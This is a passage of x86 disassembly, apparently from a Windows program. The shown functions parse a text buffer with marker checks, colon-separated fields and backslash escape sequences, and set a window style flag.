  403f4e:	57                   	push   %edi
  403f4f:	8d 4e 14             	lea    0x14(%esi),%ecx
  403f52:	e8 0e 06 00 00       	call   0x404565
  403f57:	47                   	inc    %edi
  403f58:	3b 3d e4 14 43 00    	cmp    0x4314e4,%edi
  403f5e:	72 e6                	jb     0x403f46
  403f60:	33 db                	xor    %ebx,%ebx
  403f62:	68 28 3b 40 00       	push   $0x403b28
  403f67:	6a 04                	push   $0x4
  403f69:	ff 76 04             	push   0x4(%esi)
  403f6c:	ff 36                	push   (%esi)
  403f6e:	e8 2d 63 01 00       	call   0x41a2a0
  403f73:	68 8d 3a 40 00       	push   $0x403a8d
  403f78:	6a 04                	push   $0x4
  403f7a:	ff 76 18             	push   0x18(%esi)
  403f7d:	ff 76 14             	push   0x14(%esi)
  403f80:	e8 1b 63 01 00       	call   0x41a2a0
  403f85:	83 c4 20             	add    $0x20,%esp
  403f88:	88 5d 7b             	mov    %bl,0x7b(%ebp)
  403f8b:	83 cf ff             	or     $0xffffffff,%edi
  403f8e:	89 5d 58             	mov    %ebx,0x58(%ebp)
  403f91:	89 7d 64             	mov    %edi,0x64(%ebp)
  403f94:	83 ff ff             	cmp    $0xffffffff,%edi
  403f97:	0f 85 28 01 00 00    	jne    0x4040c5
  403f9d:	8d 8d 78 dd ff ff    	lea    -0x2288(%ebp),%ecx
  403fa3:	e8 bf e1 ff ff       	call   0x402167
  403fa8:	89 45 6c             	mov    %eax,0x6c(%ebp)
  403fab:	8d 8d 78 dd ff ff    	lea    -0x2288(%ebp),%ecx
  403fb1:	68 00 20 00 00       	push   $0x2000
  403fb6:	8d 85 78 bd ff ff    	lea    -0x4288(%ebp),%eax
  403fbc:	50                   	push   %eax
  403fbd:	e8 c7 df ff ff       	call   0x401f89
  403fc2:	89 45 5c             	mov    %eax,0x5c(%ebp)
  403fc5:	8b fb                	mov    %ebx,%edi
  403fc7:	8d 48 f0             	lea    -0x10(%eax),%ecx
  403fca:	89 4d 54             	mov    %ecx,0x54(%ebp)
  403fcd:	85 c9                	test   %ecx,%ecx
  403fcf:	0f 88 b9 00 00 00    	js     0x40408e
  403fd5:	80 bc 3d 78 bd ff ff 	cmpb   $0x2a,-0x4288(%ebp,%edi,1)
  403fdc:	2a 
  403fdd:	75 29                	jne    0x404008
  403fdf:	80 bc 3d 79 bd ff ff 	cmpb   $0x2a,-0x4287(%ebp,%edi,1)
  403fe6:	2a 
  403fe7:	75 1f                	jne    0x404008
  403fe9:	6a 0b                	push   $0xb
  403feb:	8d 85 7a bd ff ff    	lea    -0x4286(%ebp),%eax
  403ff1:	03 c7                	add    %edi,%eax
  403ff3:	68 78 73 42 00       	push   $0x427378
  403ff8:	50                   	push   %eax
  403ff9:	e8 d2 66 01 00       	call   0x41a6d0
  403ffe:	83 c4 0c             	add    $0xc,%esp
  404001:	85 c0                	test   %eax,%eax
  404003:	74 7f                	je     0x404084
  404005:	8b 45 5c             	mov    0x5c(%ebp),%eax
  404008:	6a 2a                	push   $0x2a
  40400a:	5a                   	pop    %edx
  40400b:	66 39 94 3d 78 bd ff 	cmp    %dx,-0x4288(%ebp,%edi,1)
  404012:	ff 
  404013:	75 29                	jne    0x40403e
  404015:	8d 8d 7c bd ff ff    	lea    -0x4284(%ebp),%ecx
  40401b:	03 cf                	add    %edi,%ecx
  40401d:	66 39 51 fe          	cmp    %dx,-0x2(%ecx)
  404021:	75 1b                	jne    0x40403e
  404023:	83 c0 e0             	add    $0xffffffe0,%eax
  404026:	3b f8                	cmp    %eax,%edi
  404028:	7f 14                	jg     0x40403e
  40402a:	6a 0b                	push   $0xb
  40402c:	68 88 73 42 00       	push   $0x427388
  404031:	51                   	push   %ecx
  404032:	e8 81 5f 01 00       	call   0x419fb8
  404037:	83 c4 0c             	add    $0xc,%esp
  40403a:	85 c0                	test   %eax,%eax
  40403c:	74 42                	je     0x404080
  40403e:	80 bc 3d 78 bd ff ff 	cmpb   $0x52,-0x4288(%ebp,%edi,1)
  404045:	52 
  404046:	75 2a                	jne    0x404072
  404048:	80 bc 3d 79 bd ff ff 	cmpb   $0x61,-0x4287(%ebp,%edi,1)
  40404f:	61 
  404050:	75 20                	jne    0x404072
  404052:	6a 04                	push   $0x4
  404054:	8d 85 7a bd ff ff    	lea    -0x4286(%ebp),%eax
  40405a:	03 c7                	add    %edi,%eax
  40405c:	68 a4 73 42 00       	push   $0x4273a4
  404061:	50                   	push   %eax
  404062:	e8 69 66 01 00       	call   0x41a6d0
  404067:	83 c4 0c             	add    $0xc,%esp
  40406a:	85 c0                	test   %eax,%eax
  40406c:	0f 84 81 02 00 00    	je     0x4042f3
  404072:	47                   	inc    %edi
  404073:	3b 7d 54             	cmp    0x54(%ebp),%edi
  404076:	7f 16                	jg     0x40408e
  404078:	8b 45 5c             	mov    0x5c(%ebp),%eax
  40407b:	e9 55 ff ff ff       	jmp    0x403fd5
  404080:	c6 45 7b 01          	movb   $0x1,0x7b(%ebp)
  404084:	8b 45 6c             	mov    0x6c(%ebp),%eax
  404087:	03 f8                	add    %eax,%edi
  404089:	89 7d 64             	mov    %edi,0x64(%ebp)
  40408c:	eb 06                	jmp    0x404094
  40408e:	8b 45 6c             	mov    0x6c(%ebp),%eax
  404091:	8b 7d 64             	mov    0x64(%ebp),%edi
  404094:	8b 4d 5c             	mov    0x5c(%ebp),%ecx
  404097:	53                   	push   %ebx
  404098:	83 c1 f0             	add    $0xfffffff0,%ecx
  40409b:	03 c1                	add    %ecx,%eax
  40409d:	8d 8d 78 dd ff ff    	lea    -0x2288(%ebp),%ecx
  4040a3:	53                   	push   %ebx
  4040a4:	50                   	push   %eax
  4040a5:	e8 b2 df ff ff       	call   0x40205c
  4040aa:	8b 45 58             	mov    0x58(%ebp),%eax
  4040ad:	40                   	inc    %eax
  4040ae:	89 45 58             	mov    %eax,0x58(%ebp)
  4040b1:	3d 00 01 00 00       	cmp    $0x100,%eax
  4040b6:	0f 82 d8 fe ff ff    	jb     0x403f94
  4040bc:	83 ff ff             	cmp    $0xffffffff,%edi
  4040bf:	0f 84 2e 02 00 00    	je     0x4042f3
  4040c5:	53                   	push   %ebx
  4040c6:	8b c7                	mov    %edi,%eax
  4040c8:	8d 8d 78 dd ff ff    	lea    -0x2288(%ebp),%ecx
  4040ce:	99                   	cltd
  4040cf:	52                   	push   %edx
  4040d0:	50                   	push   %eax
  4040d1:	e8 86 df ff ff       	call   0x40205c
  4040d6:	68 02 00 20 00       	push   $0x200002
  4040db:	e8 eb 5f 01 00       	call   0x41a0cb
  4040e0:	8b f8                	mov    %eax,%edi
  4040e2:	89 7d 68             	mov    %edi,0x68(%ebp)
  4040e5:	59                   	pop    %ecx
  4040e6:	85 ff                	test   %edi,%edi
  4040e8:	0f 84 05 02 00 00    	je     0x4042f3
  4040ee:	68 00 00 20 00       	push   $0x200000
  4040f3:	57                   	push   %edi
  4040f4:	8d 8d 78 dd ff ff    	lea    -0x2288(%ebp),%ecx
  4040fa:	e8 8a de ff ff       	call   0x401f89
  4040ff:	8b c8                	mov    %eax,%ecx
  404101:	8a 45 7b             	mov    0x7b(%ebp),%al
  404104:	89 4d 64             	mov    %ecx,0x64(%ebp)
  404107:	84 c0                	test   %al,%al
  404109:	74 07                	je     0x404112
  40410b:	d1 e9                	shr    $1,%ecx
  40410d:	89 4d 64             	mov    %ecx,0x64(%ebp)
  404110:	eb 38                	jmp    0x40414a
  404112:	8d 04 4d 02 00 00 00 	lea    0x2(,%ecx,2),%eax
  404119:	50                   	push   %eax
  40411a:	e8 ac 5f 01 00       	call   0x41a0cb
  40411f:	89 45 78             	mov    %eax,0x78(%ebp)
  404122:	59                   	pop    %ecx
  404123:	85 c0                	test   %eax,%eax
  404125:	0f 84 c8 01 00 00    	je     0x4042f3
  40412b:	8b 4d 64             	mov    0x64(%ebp),%ecx
  40412e:	88 1c 39             	mov    %bl,(%ecx,%edi,1)
  404131:	41                   	inc    %ecx
  404132:	51                   	push   %ecx
  404133:	50                   	push   %eax
  404134:	57                   	push   %edi
  404135:	e8 93 34 00 00       	call   0x4075cd
  40413a:	57                   	push   %edi
  40413b:	e8 2e 3d 01 00       	call   0x417e6e
  404140:	8b 7d 78             	mov    0x78(%ebp),%edi
  404143:	59                   	pop    %ecx
  404144:	8b 4d 64             	mov    0x64(%ebp),%ecx
  404147:	89 7d 68             	mov    %edi,0x68(%ebp)
  40414a:	b8 00 00 10 00       	mov    $0x100000,%eax
  40414f:	3b c8                	cmp    %eax,%ecx
  404151:	77 02                	ja     0x404155
  404153:	8b c1                	mov    %ecx,%eax
  404155:	33 c9                	xor    %ecx,%ecx
  404157:	6a 64                	push   $0x64
  404159:	66 89 0c 47          	mov    %cx,(%edi,%eax,2)
  40415d:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  404163:	68 ac 73 42 00       	push   $0x4273ac
  404168:	50                   	push   %eax
  404169:	e8 12 24 00 00       	call   0x406580
  40416e:	68 02 00 02 00       	push   $0x20002
  404173:	e8 53 5f 01 00       	call   0x41a0cb
  404178:	89 45 6c             	mov    %eax,0x6c(%ebp)
  40417b:	59                   	pop    %ecx
  40417c:	85 c0                	test   %eax,%eax
  40417e:	75 0c                	jne    0x40418c
  404180:	57                   	push   %edi
  404181:	e8 e8 3c 01 00       	call   0x417e6e
  404186:	59                   	pop    %ecx
  404187:	e9 67 01 00 00       	jmp    0x4042f3
  40418c:	83 7d 64 00          	cmpl   $0x0,0x64(%ebp)
  404190:	8b cb                	mov    %ebx,%ecx
  404192:	8b d3                	mov    %ebx,%edx
  404194:	89 4d 78             	mov    %ecx,0x78(%ebp)
  404197:	88 5d 00             	mov    %bl,0x0(%ebp)
  40419a:	8b fb                	mov    %ebx,%edi
  40419c:	89 55 5c             	mov    %edx,0x5c(%ebp)
  40419f:	0f 86 e2 00 00 00    	jbe    0x404287
  4041a5:	c7 45 50 0d 00 00 00 	movl   $0xd,0x50(%ebp)
  4041ac:	c7 45 4c 0a 00 00 00 	movl   $0xa,0x4c(%ebp)
  4041b3:	c7 45 54 09 00 00 00 	movl   $0x9,0x54(%ebp)
  4041ba:	8b 45 68             	mov    0x68(%ebp),%eax
  4041bd:	85 ff                	test   %edi,%edi
  4041bf:	0f 84 f6 02 00 00    	je     0x4044bb
  4041c5:	0f b7 54 78 fe       	movzwl -0x2(%eax,%edi,2),%edx
  4041ca:	66 3b 55 50          	cmp    0x50(%ebp),%dx
  4041ce:	74 0a                	je     0x4041da
  4041d0:	66 3b 55 4c          	cmp    0x4c(%ebp),%dx
  4041d4:	0f 85 e1 02 00 00    	jne    0x4044bb
  4041da:	6a 3a                	push   $0x3a
  4041dc:	59                   	pop    %ecx
  4041dd:	66 39 0c 78          	cmp    %cx,(%eax,%edi,2)
  4041e1:	0f 85 e7 01 00 00    	jne    0x4043ce
  4041e7:	8b 75 68             	mov    0x68(%ebp),%esi
  4041ea:	83 c8 ff             	or     $0xffffffff,%eax
  4041ed:	89 45 58             	mov    %eax,0x58(%ebp)
  4041f0:	c7 45 34 b0 73 42 00 	movl   $0x4273b0,0x34(%ebp)
  4041f7:	c7 45 38 c0 73 42 00 	movl   $0x4273c0,0x38(%ebp)
  4041fe:	c7 45 3c d0 73 42 00 	movl   $0x4273d0,0x3c(%ebp)
  404205:	c7 45 40 dc 73 42 00 	movl   $0x4273dc,0x40(%ebp)
  40420c:	89 5d 60             	mov    %ebx,0x60(%ebp)
  40420f:	ff 74 9d 34          	push   0x34(%ebp,%ebx,4)
  404213:	e8 3b 3c 01 00       	call   0x417e53
  404218:	50                   	push   %eax
  404219:	ff 74 9d 34          	push   0x34(%ebp,%ebx,4)
  40421d:	8d 4e 02             	lea    0x2(%esi),%ecx
  404220:	89 45 60             	mov    %eax,0x60(%ebp)
  404223:	8d 0c 79             	lea    (%ecx,%edi,2),%ecx
  404226:	51                   	push   %ecx
  404227:	e8 8c 5d 01 00       	call   0x419fb8
  40422c:	83 c4 10             	add    $0x10,%esp
  40422f:	6a 20                	push   $0x20
  404231:	5a                   	pop    %edx
  404232:	85 c0                	test   %eax,%eax
  404234:	75 16                	jne    0x40424c
  404236:	8b 4d 60             	mov    0x60(%ebp),%ecx
  404239:	03 cf                	add    %edi,%ecx
  40423b:	66 39 54 4e 02       	cmp    %dx,0x2(%esi,%ecx,2)
  404240:	77 0a                	ja     0x40424c
  404242:	8b c3                	mov    %ebx,%eax
  404244:	8d 79 01             	lea    0x1(%ecx),%edi
  404247:	89 45 58             	mov    %eax,0x58(%ebp)
  40424a:	eb 03                	jmp    0x40424f
  40424c:	8b 45 58             	mov    0x58(%ebp),%eax
  40424f:	43                   	inc    %ebx
  404250:	83 fb 04             	cmp    $0x4,%ebx
  404253:	72 ba                	jb     0x40420f
  404255:	8b 75 48             	mov    0x48(%ebp),%esi
  404258:	33 db                	xor    %ebx,%ebx
  40425a:	85 c0                	test   %eax,%eax
  40425c:	0f 85 b0 00 00 00    	jne    0x404312
  404262:	6a 64                	push   $0x64
  404264:	68 ac 73 42 00       	push   $0x4273ac
  404269:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  40426f:	50                   	push   %eax
  404270:	e8 0b 23 00 00       	call   0x406580
  404275:	8b 4d 78             	mov    0x78(%ebp),%ecx
  404278:	3b 7d 64             	cmp    0x64(%ebp),%edi
  40427b:	0f 82 39 ff ff ff    	jb     0x4041ba
  404281:	8b 45 6c             	mov    0x6c(%ebp),%eax
  404284:	8b 55 5c             	mov    0x5c(%ebp),%edx
  404287:	51                   	push   %ecx
  404288:	50                   	push   %eax
  404289:	8d 45 00             	lea    0x0(%ebp),%eax
  40428c:	8b ce                	mov    %esi,%ecx
  40428e:	50                   	push   %eax
  40428f:	52                   	push   %edx
  404290:	e8 64 f7 ff ff       	call   0x4039f9
  404295:	ff 75 68             	push   0x68(%ebp)
  404298:	e8 d1 3b 01 00       	call   0x417e6e
  40429d:	ff 75 6c             	push   0x6c(%ebp)
  4042a0:	e8 c9 3b 01 00       	call   0x417e6e
  4042a5:	59                   	pop    %ecx
  4042a6:	59                   	pop    %ecx
  4042a7:	39 5e 2c             	cmp    %ebx,0x2c(%esi)
  4042aa:	76 18                	jbe    0x4042c4
  4042ac:	53                   	push   %ebx
  4042ad:	8d 4e 3c             	lea    0x3c(%esi),%ecx
  4042b0:	e8 b0 02 00 00       	call   0x404565
  4042b5:	53                   	push   %ebx
  4042b6:	8d 4e 50             	lea    0x50(%esi),%ecx
  4042b9:	e8 a7 02 00 00       	call   0x404565
  4042be:	43                   	inc    %ebx
  4042bf:	3b 5e 2c             	cmp    0x2c(%esi),%ebx
  4042c2:	72 e8                	jb     0x4042ac
  4042c4:	8b 46 28             	mov    0x28(%esi),%eax
  4042c7:	68 ce 3b 40 00       	push   $0x403bce
  4042cc:	6a 04                	push   $0x4
  4042ce:	ff 76 40             	push   0x40(%esi)
  4042d1:	a3 14 3f 43 00       	mov    %eax,0x433f14
  4042d6:	ff 76 3c             	push   0x3c(%esi)
  4042d9:	e8 c2 5f 01 00       	call   0x41a2a0
  4042de:	68 fd 3b 40 00       	push   $0x403bfd
  4042e3:	6a 04                	push   $0x4
  4042e5:	ff 76 54             	push   0x54(%esi)
  4042e8:	ff 76 50             	push   0x50(%esi)
  4042eb:	e8 b0 5f 01 00       	call   0x41a2a0
  4042f0:	83 c4 20             	add    $0x20,%esp
  4042f3:	8d 8d 78 dd ff ff    	lea    -0x2288(%ebp),%ecx
  4042f9:	e8 c0 d7 ff ff       	call   0x401abe
  4042fe:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404301:	5f                   	pop    %edi
  404302:	5e                   	pop    %esi
  404303:	5b                   	pop    %ebx
  404304:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40430b:	8d 65 70             	lea    0x70(%ebp),%esp
  40430e:	5d                   	pop    %ebp
  40430f:	c2 04 00             	ret    $0x4
  404312:	8b 45 68             	mov    0x68(%ebp),%eax
  404315:	0f 8e b3 00 00 00    	jle    0x4043ce
  40431b:	0f b7 0c 78          	movzwl (%eax,%edi,2),%ecx
  40431f:	66 3b ca             	cmp    %dx,%cx
  404322:	74 06                	je     0x40432a
  404324:	66 3b 4d 54          	cmp    0x54(%ebp),%cx
  404328:	75 03                	jne    0x40432d
  40432a:	47                   	inc    %edi
  40432b:	eb ee                	jmp    0x40431b
  40432d:	8d 14 78             	lea    (%eax,%edi,2),%edx
  404330:	89 5d 60             	mov    %ebx,0x60(%ebp)
  404333:	6a 20                	push   $0x20
  404335:	58                   	pop    %eax
  404336:	8b cb                	mov    %ebx,%ecx
  404338:	66 39 02             	cmp    %ax,(%edx)
  40433b:	76 1f                	jbe    0x40435c
  40433d:	83 f9 63             	cmp    $0x63,%ecx
  404340:	73 17                	jae    0x404359
  404342:	66 8b 02             	mov    (%edx),%ax
  404345:	83 c2 02             	add    $0x2,%edx
  404348:	66 89 84 4d 64 fe ff 	mov    %ax,-0x19c(%ebp,%ecx,2)
  40434f:	ff 
  404350:	41                   	inc    %ecx
  404351:	6a 20                	push   $0x20
  404353:	58                   	pop    %eax
  404354:	66 39 02             	cmp    %ax,(%edx)
  404357:	77 e4                	ja     0x40433d
  404359:	89 4d 60             	mov    %ecx,0x60(%ebp)
  40435c:	33 c0                	xor    %eax,%eax
  40435e:	66 89 84 4d 64 fe ff 	mov    %ax,-0x19c(%ebp,%ecx,2)
  404365:	ff 
  404366:	8d 45 90             	lea    -0x70(%ebp),%eax
  404369:	6a 64                	push   $0x64
  40436b:	50                   	push   %eax
  40436c:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  404372:	50                   	push   %eax
  404373:	e8 9a 34 00 00       	call   0x407812
  404378:	03 7d 60             	add    0x60(%ebp),%edi
  40437b:	8b 45 58             	mov    0x58(%ebp),%eax
  40437e:	83 f8 03             	cmp    $0x3,%eax
  404381:	75 21                	jne    0x4043a4
  404383:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  404389:	68 f0 73 42 00       	push   $0x4273f0
  40438e:	50                   	push   %eax
  40438f:	e8 a1 5b 01 00       	call   0x419f35
  404394:	f7 d8                	neg    %eax
  404396:	59                   	pop    %ecx
  404397:	1a c0                	sbb    %al,%al
  404399:	fe c0                	inc    %al
  40439b:	59                   	pop    %ecx
  40439c:	88 46 64             	mov    %al,0x64(%esi)
  40439f:	e9 d1 fe ff ff       	jmp    0x404275
  4043a4:	83 f8 01             	cmp    $0x1,%eax
  4043a7:	b8 f8 73 42 00       	mov    $0x4273f8,%eax
  4043ac:	74 05                	je     0x4043b3
  4043ae:	b8 00 74 42 00       	mov    $0x427400,%eax
  4043b3:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4043b6:	51                   	push   %ecx
  4043b7:	50                   	push   %eax
  4043b8:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  4043be:	6a 64                	push   $0x64
  4043c0:	50                   	push   %eax
  4043c1:	e8 f7 04 00 00       	call   0x4048bd
  4043c6:	83 c4 10             	add    $0x10,%esp
  4043c9:	e9 a7 fe ff ff       	jmp    0x404275
  4043ce:	8d 04 78             	lea    (%eax,%edi,2),%eax
  4043d1:	89 45 60             	mov    %eax,0x60(%ebp)
  4043d4:	0f b7 00             	movzwl (%eax),%eax
  4043d7:	50                   	push   %eax
  4043d8:	e8 29 20 00 00       	call   0x406406
  4043dd:	84 c0                	test   %al,%al
  4043df:	0f 84 d0 00 00 00    	je     0x4044b5
  4043e5:	6a 64                	push   $0x64
  4043e7:	ff 75 60             	push   0x60(%ebp)
  4043ea:	8d 85 9c fd ff ff    	lea    -0x264(%ebp),%eax
  4043f0:	50                   	push   %eax
  4043f1:	e8 e5 21 00 00       	call   0x4065db
  4043f6:	8d 85 9c fd ff ff    	lea    -0x264(%ebp),%eax
  4043fc:	68 08 74 42 00       	push   $0x427408
  404401:	50                   	push   %eax
  404402:	e8 eb 5b 01 00       	call   0x419ff2
  404407:	89 45 60             	mov    %eax,0x60(%ebp)
  40440a:	59                   	pop    %ecx
  40440b:	59                   	pop    %ecx
  40440c:	85 c0                	test   %eax,%eax
  40440e:	0f 84 a1 00 00 00    	je     0x4044b5
  404414:	33 c9                	xor    %ecx,%ecx
  404416:	66 89 08             	mov    %cx,(%eax)
  404419:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
  40441f:	6a 64                	push   $0x64
  404421:	50                   	push   %eax
  404422:	8d 85 9c fd ff ff    	lea    -0x264(%ebp),%eax
  404428:	50                   	push   %eax
  404429:	e8 e4 33 00 00       	call   0x407812
  40442e:	6a 64                	push   $0x64
  404430:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  404436:	50                   	push   %eax
  404437:	8d 45 90             	lea    -0x70(%ebp),%eax
  40443a:	50                   	push   %eax
  40443b:	e8 40 21 00 00       	call   0x406580
  404440:	6a 64                	push   $0x64
  404442:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
  404448:	50                   	push   %eax
  404449:	8d 45 90             	lea    -0x70(%ebp),%eax
  40444c:	50                   	push   %eax
  40444d:	e8 07 21 00 00       	call   0x406559
  404452:	6a 32                	push   $0x32
  404454:	8d 45 90             	lea    -0x70(%ebp),%eax
  404457:	50                   	push   %eax
  404458:	8d 45 00             	lea    0x0(%ebp),%eax
  40445b:	50                   	push   %eax
  40445c:	e8 1f 21 00 00       	call   0x406580
  404461:	68 b3 3b 40 00       	push   $0x403bb3
  404466:	6a 04                	push   $0x4
  404468:	ff 76 04             	push   0x4(%esi)
  40446b:	8d 45 90             	lea    -0x70(%ebp),%eax
  40446e:	ff 36                	push   (%esi)
  404470:	50                   	push   %eax
  404471:	e8 6b 5c 01 00       	call   0x41a0e1
  404476:	83 c4 14             	add    $0x14,%esp
  404479:	85 c0                	test   %eax,%eax
  40447b:	74 0c                	je     0x404489
  40447d:	6b 00 0c             	imul   $0xc,(%eax),%eax
  404480:	8b 80 40 10 43 00    	mov    0x431040(%eax),%eax
  404486:	89 45 5c             	mov    %eax,0x5c(%ebp)
  404489:	8b 45 60             	mov    0x60(%ebp),%eax
  40448c:	8d 8d 9c fd ff ff    	lea    -0x264(%ebp),%ecx
  404492:	2b c1                	sub    %ecx,%eax
  404494:	d1 f8                	sar    $1,%eax
  404496:	40                   	inc    %eax
  404497:	6a 20                	push   $0x20
  404499:	03 f8                	add    %eax,%edi
  40449b:	8b 45 68             	mov    0x68(%ebp),%eax
  40449e:	5a                   	pop    %edx
  40449f:	0f b7 0c 78          	movzwl (%eax,%edi,2),%ecx
  4044a3:	66 3b ca             	cmp    %dx,%cx
  4044a6:	74 0a                	je     0x4044b2
  4044a8:	66 3b 4d 54          	cmp    0x54(%ebp),%cx
  4044ac:	0f 85 c3 fd ff ff    	jne    0x404275
  4044b2:	47                   	inc    %edi
  4044b3:	eb ea                	jmp    0x40449f
  4044b5:	8b 4d 78             	mov    0x78(%ebp),%ecx
  4044b8:	8b 45 68             	mov    0x68(%ebp),%eax
  4044bb:	0f b7 14 78          	movzwl (%eax,%edi,2),%edx
  4044bf:	47                   	inc    %edi
  4044c0:	66 85 d2             	test   %dx,%dx
  4044c3:	0f 84 b8 fd ff ff    	je     0x404281
  4044c9:	66 3b 55 44          	cmp    0x44(%ebp),%dx
  4044cd:	75 4e                	jne    0x40451d
  4044cf:	81 f9 00 00 01 00    	cmp    $0x10000,%ecx
  4044d5:	0f 83 9d fd ff ff    	jae    0x404278
  4044db:	0f b7 04 78          	movzwl (%eax,%edi,2),%eax
  4044df:	83 e8 22             	sub    $0x22,%eax
  4044e2:	74 25                	je     0x404509
  4044e4:	83 e8 3a             	sub    $0x3a,%eax
  4044e7:	74 1c                	je     0x404505
  4044e9:	83 e8 12             	sub    $0x12,%eax
  4044ec:	74 13                	je     0x404501
  4044ee:	83 e8 04             	sub    $0x4,%eax
  4044f1:	74 0a                	je     0x4044fd
  4044f3:	48                   	dec    %eax
  4044f4:	83 e8 01             	sub    $0x1,%eax
  4044f7:	75 34                	jne    0x40452d
  4044f9:	6a 09                	push   $0x9
  4044fb:	eb 0e                	jmp    0x40450b
  4044fd:	6a 0d                	push   $0xd
  4044ff:	eb 0a                	jmp    0x40450b
  404501:	6a 0a                	push   $0xa
  404503:	eb 06                	jmp    0x40450b
  404505:	6a 5c                	push   $0x5c
  404507:	eb 02                	jmp    0x40450b
  404509:	6a 22                	push   $0x22
  40450b:	8b 45 6c             	mov    0x6c(%ebp),%eax
  40450e:	5a                   	pop    %edx
  40450f:	66 89 14 48          	mov    %dx,(%eax,%ecx,2)
  404513:	41                   	inc    %ecx
  404514:	89 4d 78             	mov    %ecx,0x78(%ebp)
  404517:	47                   	inc    %edi
  404518:	e9 5b fd ff ff       	jmp    0x404278
  40451d:	6a 0d                	push   $0xd
  40451f:	58                   	pop    %eax
  404520:	66 3b d0             	cmp    %ax,%dx
  404523:	74 24                	je     0x404549
  404525:	6a 0a                	push   $0xa
  404527:	58                   	pop    %eax
  404528:	66 3b d0             	cmp    %ax,%dx
  40452b:	74 1c                	je     0x404549
  40452d:	81 f9 00 00 01 00    	cmp    $0x10000,%ecx
  404533:	0f 83 3f fd ff ff    	jae    0x404278
  404539:	8b 45 6c             	mov    0x6c(%ebp),%eax
  40453c:	66 89 14 48          	mov    %dx,(%eax,%ecx,2)
  404540:	41                   	inc    %ecx
  404541:	89 4d 78             	mov    %ecx,0x78(%ebp)
  404544:	e9 2f fd ff ff       	jmp    0x404278
  404549:	51                   	push   %ecx
  40454a:	ff 75 6c             	push   0x6c(%ebp)
  40454d:	8d 45 00             	lea    0x0(%ebp),%eax
  404550:	8b ce                	mov    %esi,%ecx
  404552:	50                   	push   %eax
  404553:	ff 75 5c             	push   0x5c(%ebp)
  404556:	e8 9e f4 ff ff       	call   0x4039f9
  40455b:	88 5d 00             	mov    %bl,0x0(%ebp)
  40455e:	8b cb                	mov    %ebx,%ecx
  404560:	89 5d 5c             	mov    %ebx,0x5c(%ebp)
  404563:	eb dc                	jmp    0x404541
  404565:	56                   	push   %esi
  404566:	6a 01                	push   $0x1
  404568:	8b f1                	mov    %ecx,%esi
  40456a:	e8 08 f3 ff ff       	call   0x403877
  40456f:	8b 56 04             	mov    0x4(%esi),%edx
  404572:	8b 0e                	mov    (%esi),%ecx
  404574:	8b 44 24 08          	mov    0x8(%esp),%eax
  404578:	5e                   	pop    %esi
  404579:	89 44 91 fc          	mov    %eax,-0x4(%ecx,%edx,4)
  40457d:	c2 04 00             	ret    $0x4
  404580:	56                   	push   %esi
  404581:	57                   	push   %edi
  404582:	6a 01                	push   $0x1
  404584:	8b f1                	mov    %ecx,%esi
  404586:	e8 b0 f3 ff ff       	call   0x40393b
  40458b:	6b 56 04 0c          	imul   $0xc,0x4(%esi),%edx
  40458f:	8b 3e                	mov    (%esi),%edi
  404591:	8d 74 24 0c          	lea    0xc(%esp),%esi
  404595:	83 c7 f4             	add    $0xfffffff4,%edi
  404598:	03 fa                	add    %edx,%edi
  40459a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40459b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40459c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40459d:	5f                   	pop    %edi
  40459e:	5e                   	pop    %esi
  40459f:	c2 0c 00             	ret    $0xc
  4045a2:	56                   	push   %esi
  4045a3:	6a 00                	push   $0x0
  4045a5:	8b f1                	mov    %ecx,%esi
  4045a7:	ff 15 68 70 42 00    	call   *0x427068
  4045ad:	6a 05                	push   $0x5
  4045af:	68 f0 73 42 00       	push   $0x4273f0
  4045b4:	50                   	push   %eax
  4045b5:	ff 15 6c 70 42 00    	call   *0x42706c
  4045bb:	85 c0                	test   %eax,%eax
  4045bd:	74 04                	je     0x4045c3
  4045bf:	c6 46 64 01          	movb   $0x1,0x64(%esi)
  4045c3:	5e                   	pop    %esi
  4045c4:	c3                   	ret
  4045c5:	80 79 64 00          	cmpb   $0x0,0x64(%ecx)
  4045c9:	74 1e                	je     0x4045e9
  4045cb:	6a ec                	push   $0xffffffec
  4045cd:	ff 74 24 08          	push   0x8(%esp)
  4045d1:	ff 15 80 1e 43 00    	call   *0x431e80
  4045d7:	0d 00 00 40 00       	or     $0x400000,%eax
  4045dc:	50                   	push   %eax
  4045dd:	6a ec                	push   $0xffffffec
  4045df:	ff 74 24 0c          	push   0xc(%esp)
  4045e3:	ff 15 7c 1e 43 00    	call   *0x431e7c
  4045e9:	c2 04 00             	ret    $0x4
  4045ec:	81 ec 40 09 00 00    	sub    $0x940,%esp
  4045f2:	53                   	push   %ebx
  4045f3:	55                   	push   %ebp
  4045f4:	56                   	push   %esi
  4045f5:	57                   	push   %edi
  4045f6:	ff b4 24 58 09 00 00 	push   0x958(%esp)
  4045fd:	8d 84 24 b4 00 00 00 	lea    0xb4(%esp),%eax
  404604:	8b e9                	mov    %ecx,%ebp
  404606:	68 2c 74 42 00       	push   $0x42742c
  40460b:	6a 50                	push   $0x50
  40460d:	50                   	push   %eax
  40460e:	89 6c 24 2c          	mov    %ebp,0x2c(%esp)
  404612:	e8 fe f0 ff ff       	call   0x403715
  404617:	83 c4 10             	add    $0x10,%esp
  40461a:	8d 44 24 60          	lea    0x60(%esp),%eax
  40461e:	6a 50                	push   $0x50
  404620:	50                   	push   %eax
  404621:	8d 84 24 b8 00 00 00 	lea    0xb8(%esp),%eax
  404628:	50                   	push   %eax
  404629:	e8 e4 31 00 00       	call   0x407812
  40462e:	8d 44 24 60          	lea    0x60(%esp),%eax
  404632:	50                   	push   %eax
  404633:	e8 08 5a 01 00       	call   0x41a040
  404638:	8b bc 24 58 09 00 00 	mov    0x958(%esp),%edi
  40463f:	33 db                	xor    %ebx,%ebx
  404641:	59                   	pop    %ecx
